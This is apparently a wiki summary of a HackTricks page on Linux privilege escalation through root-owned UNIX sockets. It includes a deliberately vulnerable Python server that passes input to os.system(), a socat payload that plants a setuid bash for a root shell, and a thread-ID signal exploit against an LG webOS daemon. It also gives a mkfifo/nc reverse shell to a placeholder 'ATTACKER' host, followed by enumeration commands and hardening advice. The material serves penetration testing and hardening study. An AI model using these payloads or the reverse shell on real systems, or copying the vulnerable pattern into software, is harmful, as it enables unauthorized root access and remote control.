---
title: "HackTricks: Socket Command Injection"
tags: [linux-hardening, privilege-escalation, unix-sockets, ipc]
sources: [hacktricks-socket-command-injection.md]
updated: 2026-05-01
---

# HackTricks: Socket Command Injection

Source: [hacktricks-socket-command-injection.md](../../raw/hacktricks-socket-command-injection.md)

## Key Takeaways

UNIX domain sockets owned by root that pass untrusted client input to `os.system()` or shell equivalents are command injection escalation paths. The exploit is simple: write a payload to the socket with `socat` or similar. A subtler variant exists where privileged daemons trust client-supplied thread IDs and pair them with signal delivery — allowing an unprivileged caller to trigger privileged code paths.

## Basic Pattern — `os.system()` on socket input

```python
# Vulnerable server (Python example)
server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")   # world-writable!
while True:
    conn, addr = server.accept()
    datagram = conn.recv(1024)
    if datagram:
        os.system(datagram)   # command injection
```

**Exploit:**

```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" \
  | socat - UNIX-CLIENT:/tmp/socket_test.s
/tmp/bash -p   # → root shell
```

## Case Study — Signal-Triggered Escalation (LG webOS)

Some root daemons expose sockets where the protocol accepts a **client-supplied thread ID (TID)** and later delivers a signal to that TID, triggering a privileged code path.

```python
import socket, struct, os, threading, time

th = threading.Thread(target=time.sleep, args=(600,))
th.start()
tid = th.native_id   # Python ≥ 3.8

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A' * 0x80)
s.recv(4)           # sync
os.kill(tid, 4)     # SIGILL → triggers privileged handler
```

Root shell pivot:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 23231 > /tmp/f
```

**Root cause:** daemon trusts externally supplied TID as a security-relevant value and binds it to a privileged signal handler without caller credential verification.

## Enumeration

```bash
# Find world-writable or group-accessible UNIX sockets
find /tmp /var/run /run -type s 2>/dev/null
ls -la /tmp/*.s /var/run/*.sock /run/*.sock 2>/dev/null

# Check socket file permissions and owning process
netstat -a -p --unix 2>/dev/null | grep -v "^unix.*dgram.*@$"
ss -xp
```

## Hardening

- Never pass socket input directly to `system()` / `os.system()` / `exec()`
- Enforce peer credentials (`SO_PEERCRED`) before processing privileged requests
- Do not accept client-supplied TIDs, PIDs, or UIDs as authorization tokens — verify via kernel credential APIs

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: D-Bus Enumeration](hacktricks-dbus-enumeration.md)
- [HackTricks](../entities/hacktricks.md)
